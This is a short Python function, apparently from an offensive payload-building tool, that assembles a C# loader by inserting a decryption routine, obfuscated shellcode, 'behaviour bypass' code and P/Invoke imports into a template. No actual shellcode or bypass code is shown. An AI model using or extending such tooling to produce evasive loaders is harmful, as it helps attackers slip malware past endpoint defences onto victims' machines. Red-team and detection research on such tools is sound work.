from helpers.log import logger

def generate_csharp_payload(template,shellcode,decryption_routine,behaviour_bypass,markers):
    # Adding the decryption loop

    template.insert(markers["decryption_loop"],decryption_routine)
    logger.debug("✅ Added the decryption routine into csharp template")

    # Injecting the scrambled Payload
    template.insert(markers["payload"],shellcode)
    logger.debug("✅ Added the obfuscated shellcode into csharp template")

    # Adding the behaviour bypass
    template.insert(markers["behaviour_bypass"],behaviour_bypass["code"])
    logger.debug("✅ Added the behaviour bypasses into csharp template")

    # Adding the pinvoke lines
    template.insert(markers["pinvoke"],behaviour_bypass["pinvoke_imports"])
    logger.debug("✅ Added the pinvoke import lines into csharp template")
    return template
